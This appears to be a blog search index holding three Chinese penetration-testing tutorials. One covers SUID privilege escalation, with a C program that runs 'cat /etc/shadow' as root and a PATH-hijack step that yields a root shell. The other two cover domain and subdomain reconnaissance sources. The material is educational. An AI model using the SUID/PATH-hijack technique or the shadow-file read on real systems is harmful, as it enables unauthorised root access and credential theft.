<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>SUID提权</title>
    <url>/archives/5c206d0f.html</url>
    <content><![CDATA[<div align='center' ><font color=#FF000 size='70'>SUID提权</font></div>
&nbsp;


<p><font color=#FF000 size=4 ><strong>本文档只做讲解，请勿用做非法用途，否则后果自负，谢谢！！！</strong></font><br>&nbsp;</p>
<h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>   1.几乎所有的Linux系统都可以执行<br>   2.无需工具，只需本地编辑文件即可</p>
<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>   1.只是临时提权<br>   2.需要root编辑文件并设置SUID权限</p>
<h2 id="提权准备"><a href="#提权准备" class="headerlink" title="提权准备"></a>提权准备</h2><h3 id="1-使用root编辑suid-c文件"><a href="#1-使用root编辑suid-c文件" class="headerlink" title="1.使用root编辑suid.c文件"></a>1.使用root编辑suid.c文件</h3><p>#include&lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>int main()<br>{<br>setuid(0);//run as root<br>system(“id”);<br>system(“cat /etc/shadow”);<br>}<br><img src="/archives/SUID%E6%8F%90%E6%9D%83/1.jpg" alt="suid.c文件内容"></p>
<h3 id="2-root编译并设置SUID权限"><a href="#2-root编译并设置SUID权限" class="headerlink" title="2.root编译并设置SUID权限"></a>2.root编译并设置SUID权限</h3><p>gcc suid.c -o suid-exp<br>chmod 4775 suid-exp<br><img src="/archives/SUID%E6%8F%90%E6%9D%83/2.jpg" alt="设置SUID权限"><br>S代表suid属性<br>find / -perm -u=s -type f 2&gt;/dev/null<br><img src="/archives/SUID%E6%8F%90%E6%9D%83/3.jpg" alt="查找SUID文件"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="1-切换普通用户"><a href="#1-切换普通用户" class="headerlink" title="1.切换普通用户"></a>1.切换普通用户</h3><p><img src="/archives/SUID%E6%8F%90%E6%9D%83/4.jpg" alt="切换普通用户"></p>
<h3 id="2-提权"><a href="#2-提权" class="headerlink" title="2.提权"></a>2.提权</h3><p>echo “/bin/bash” &gt; cat &amp;&amp; chmod 777 cat<br>export PATH=.:$PATH<br><img src="/archives/SUID%E6%8F%90%E6%9D%83/5.jpg" alt="设置环境变量"><br>./suid-exp<br><img src="/archives/SUID%E6%8F%90%E6%9D%83/6.jpg" alt="提权"><br>可以发现此时已经是root用户</p>
<h2 id="提权测试"><a href="#提权测试" class="headerlink" title="提权测试"></a>提权测试</h2><p><img src="/archives/SUID%E6%8F%90%E6%9D%83/7.jpg" alt="提权测试"><br>可以发现此时可以创建用户了</p>
]]></content>
      <categories>
        <category>提权</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集之域名收集</title>
    <url>/archives/56dc95ea.html</url>
    <content><![CDATA[<div align='center' ><font color=#FF000 size='70'>信息收集之域名收集</font></div>
&nbsp;


<p><font color=#FF000 size=4 ><strong>本文档只做讲解，请勿用做非法用途，否则后果自负，谢谢！！！</strong></font><br>&nbsp;</p>
<h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p>域名(Domain Name)：<br>&emsp;&emsp;由一串点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位<br>&emsp;&emsp;例如<a href="http://www.baidu.com/">www.baidu.com</a><br>&emsp;&emsp;&emsp;&emsp;其中www是对应的主机头，baidu.com是域名<br>&emsp;&emsp;浏览网站过程：从DNS服务器获得指定域名对应的IP地址</p>
<h2 id="WHOIS"><a href="#WHOIS" class="headerlink" title="WHOIS"></a>WHOIS</h2><p>&emsp;&emsp;查询域名的IP以及所有者等信息的传输协议。或者说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库(如域名所有人、域名注册商以及联系电话等)<br>&emsp;&emsp;不同域名后缀的whois信息需要到不同的whois数据库查询。如.com结尾的域名由.com域名运营商VeriSign管理，.cn结尾的域名由CNNIC(中国互联网络信息中心)管理<br>&nbsp;<br>WHOIS协议：<br>&emsp;&emsp;先向WHOIS服务器的TCP端口43建立一个连接，发送查询关键字并加上回车换行，然后接收服务器返回查询结果<br>&emsp;&emsp;通过whois查询可以获得域名注册者邮箱地址等信息。一般情况下中小型网站域名注册者就是网站管理员。利用搜索引擎对whois查询到的信息进行搜索，获取更多域名注册者的个人信息<br>&nbsp;</p>
<h3 id="查询方法"><a href="#查询方法" class="headerlink" title="查询方法"></a>查询方法</h3><ol>
<li>   web接口查询：<br>&emsp;&emsp;    <a href="https://whois.aliyun.com/">https://whois.aliyun.com</a><br>&emsp;&emsp;    <a href="https://www.whois365.com/cn">https://www.whois365.com/cn</a><br>&emsp;&emsp;    <a href="http://whois.chinaz.com/">http://whois.chinaz.com</a><br>&emsp;&emsp;    <a href="https://whois.aizhan.com/">https://whois.aizhan.com</a></li>
<li>   whois命令查询：<br>Kali Linux下自带whois查询工具<br>&emsp;&emsp;命令：whois [需要查询的域名]</li>
</ol>
<h2 id="备案信息"><a href="#备案信息" class="headerlink" title="备案信息"></a>备案信息</h2><p>ICP备案：Internet Content Provider网络内容供应商<br>    &emsp;&emsp;《互联网信息服务管理办法》指出互联网信息服务分为经营性和非经营性两类。国家对经营性互联网信息服务实行许可制度；对非经营性互联网信息服务实行备案制度。未取得许可或者未履行备案手续的，不得从事互联网信息服务。在中华人民共和国境内提供非经营性互联网信息服务，应当依法履行备案手续。未经国家机关单位许可备案，不得在中华人民共和国境内从事非经营性互联网信息服务。<br>&emsp;&emsp;备案好处：为了防止在网上从事非法的网站经营活动，打击不良互联网信息的传播，如果网站不备案，很有可能被查处以后关停<br>&nbsp;</p>
<h3 id="查询方法-1"><a href="#查询方法-1" class="headerlink" title="查询方法"></a>查询方法</h3><p>web接口查询：<br>&emsp;&emsp;    <a href="http://www.beianbeian.com/">http://www.beianbeian.com</a><br>&emsp;&emsp;    <a href="http://www.miitbeian.gov.cn/publish/query/indexFirst.action">http://www.miitbeian.gov.cn/publish/query/indexFirst.action</a><br>&emsp;&emsp;    <a href="http://www.tianyancha.com/">http://www.tianyancha.com</a></p>
<p><font color=#FF000 size=4 >&emsp;&emsp;建议使用多种工具进行查询，因为每种工具查询出来的结果不一定相同，所以每个工具查询完之后需要自己进行整理与汇总，从而得出自己需要的信息</font></p>
]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
        <tag>域名</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集之子域名收集</title>
    <url>/archives/a1df1c74.html</url>
    <content><![CDATA[<div align='center' ><font color=#FF000 size='70'>信息收集之子域名收集</font></div>
&nbsp;


<p><font color=#FF000 size=4 ><strong>本文档只做讲解，请勿用做非法用途，否则后果自负，谢谢！！！</strong></font><br>&nbsp;</p>
<p>&emsp;&emsp;顶级域名：”.com”、”.net” 、”.org” 、”.cn” 等</p>
<h2 id="子域名-Subdomain-Name"><a href="#子域名-Subdomain-Name" class="headerlink" title="子域名(Subdomain Name)"></a>子域名(Subdomain Name)</h2><p>&emsp;&emsp;顶级域名前加前缀的都是该顶级域名的子域名，而子域名根据技术的多少分为二级子域名，三级子域名以及多级子域名<br>&emsp;&emsp;中国一级域名：.cn，在国际互联网信息中心正式注册并运行的顶级域名<br>中国二级域名：<br>&emsp;类别域名(6个)：<br>&emsp;&emsp;.ac：用于科研机构<br>&emsp;&emsp;.com：用于工商金融企业<br>&emsp;&emsp;.edu：用于教育机构<br>&emsp;&emsp;.gov：用于政府部门<br>&emsp;&emsp;.net：用于互联网网络信息中心和运行中心<br>&emsp;&emsp;.org：用于非盈利组织<br>&emsp;行政区域名(34个)<br>&emsp;&emsp;分别对应中国各省、自治区和直辖市</p>
<p>&emsp;&emsp;子域名是某个主域的二级域名或多级域名，在防御措施严密的情况下无法直接拿下主域，我们可以采用迂回战术拿下子域名，然后无限靠近主域</p>
<h2 id="如何挖掘子域名？"><a href="#如何挖掘子域名？" class="headerlink" title="如何挖掘子域名？"></a>如何挖掘子域名？</h2><h3 id="子域名挖掘工具"><a href="#子域名挖掘工具" class="headerlink" title="子域名挖掘工具"></a>子域名挖掘工具</h3><p>Maltego CE、wydomain、subDomainsBrute、dnsmaper、Layer子域名挖掘机</p>
<h3 id="搜索引擎挖掘"><a href="#搜索引擎挖掘" class="headerlink" title="搜索引擎挖掘"></a>搜索引擎挖掘</h3><p>Google中输入site:baidu.com</p>
<h3 id="第三方网站查询"><a href="#第三方网站查询" class="headerlink" title="第三方网站查询"></a>第三方网站查询</h3><p><a href="http://tool.chinaz.com/subdomain">http://tool.chinaz.com/subdomain</a><br><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p>
<h3 id="证书透明度公开日志枚举"><a href="#证书透明度公开日志枚举" class="headerlink" title="证书透明度公开日志枚举"></a>证书透明度公开日志枚举</h3><p><a href="https://crt.sh/">https://crt.sh</a><br><a href="http://censys.io/">http://censys.io</a></p>
<h3 id="其他途径"><a href="#其他途径" class="headerlink" title="其他途径"></a>其他途径</h3><p><a href="https://phpinfo.me/domain">https://phpinfo.me/domain</a><br><a href="http://dns.aizhan.com/">http://dns.aizhan.com</a></p>
]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
        <tag>子域名</tag>
      </tags>
  </entry>
</search>
